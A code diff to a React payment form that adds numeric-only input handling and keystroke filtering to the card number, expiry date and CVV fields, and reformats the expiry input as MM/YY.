@@ -226,12 +226,15 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{ textAlign: "right" }}
                 ref={cardRef}
                 value={fields.name}
+                inputMode="numeric"
+                pattern="[0-9 ]*"
                 onChange={e => {
                   let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                   v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                   setFields(f => ({ ...f, name: v }));
                   setCardError("");
                 }}
+                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(e.key)) e.preventDefault(); }}
                 className={`${inputClass("name", cardError)} pr-4 pl-14`}
               />
               {fields.name.replace(/\s/g, "").length >= 1 && (
@@ -260,7 +263,16 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
                 ref={expiryRef}
                 value={fields.age}
-                onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
+                inputMode="numeric"
+                pattern="[0-9/]*"
+                onChange={e => {
+                  const raw = e.target.value.replace(/[^0-9/]/g, "");
+                  let v = raw.replace(/\//g, "");
+                  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4);
+                  setFields(f => ({ ...f, age: v }));
+                  setExpiryError("");
+                }}
+                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(e.key)) e.preventDefault(); }}
                 className={inputClass("age", expiryError)}
               />
               {expiryError && <p className="text-red-400 text-xs font-bold mt-1.5">{expiryError}</p>}
@@ -271,9 +283,12 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
                 ref={cvvRef}
                 value={fields.cvv}
+                inputMode="numeric"
+                pattern="[0-9]*"
                 onFocus={() => setFlipped(true)}
                 onBlur={() => setFlipped(false)}
                 onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
+                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(e.key)) e.preventDefault(); }}
                 className={inputClass("cvv", cvvError)}
               />
               {cvvError && <p className="text-red-400 text-xs font-bold mt-1.5">{cvvError}</p>}
